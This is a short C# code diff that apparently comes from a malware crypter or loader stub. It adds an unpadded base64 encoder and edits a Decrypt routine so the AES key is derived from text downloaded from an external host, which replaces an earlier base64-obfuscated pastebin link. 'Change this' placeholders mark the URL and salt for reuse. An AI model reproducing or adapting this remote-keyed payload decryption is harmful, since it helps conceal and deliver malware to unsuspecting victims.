@@ -37,10 +37,21 @@ namespace Encode
             return null;
         }
 
+        public static string Encode(string plainText)
+        {
+            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
+            string result = System.Convert.ToBase64String(plainTextBytes);
+            if (result.Contains("="))
+            {
+                result = result.Substring(0, result.IndexOf("="));
+            }
+            return result;
+        }
+
         public static byte[] Decrypt(byte[] input)
         {
             PasswordDeriveBytes pdb =
-          new PasswordDeriveBytes(new WebClient().DownloadString(Decode("aHR0cDovL3Bhc3RlYmluLmNvbS9yYXcvV25uUzhoVkg")), // Change this
+          new PasswordDeriveBytes(new WebClient().DownloadString("http://zurrapa.host/bm9LYXBwYQ"), // Change this
           new byte[] { 0x43, 0x87, 0x23, 0x72 }); // Change this
             MemoryStream ms = new MemoryStream();
             Aes aes = new AesManaged();
